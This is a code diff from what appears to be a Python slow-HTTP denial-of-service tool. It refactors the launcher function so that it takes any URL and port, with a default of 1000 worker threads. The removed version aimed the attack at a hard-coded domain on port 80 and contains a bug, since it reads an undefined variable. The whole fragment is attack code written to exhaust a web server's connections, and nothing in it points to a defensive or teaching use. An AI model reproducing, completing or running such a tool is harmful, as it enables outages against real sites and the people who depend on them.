@@ -46,16 +46,10 @@ def stop_slow_http_attack() -> None:
     ongoing = False
 
 
-def start_attack() -> None:
-    number_of_workers = 0
-    while True:
-        worker_input = input('Insert number of workers: ')
-        try:
-            number_of_workers = int(season_input)
-            break
-        except:
-            print('Must be a number!!')
-    thread = Thread(target = start_slow_http_attack, args = ('rtrkblhrana.com', 80, number_of_workers))
+def start_attack(url: str,
+                port: int,
+                workers_count: int = 1000) -> None:
+    thread = Thread(target = start_slow_http_attack, args = (url, port, workers_count))
     thread.start()
 
 
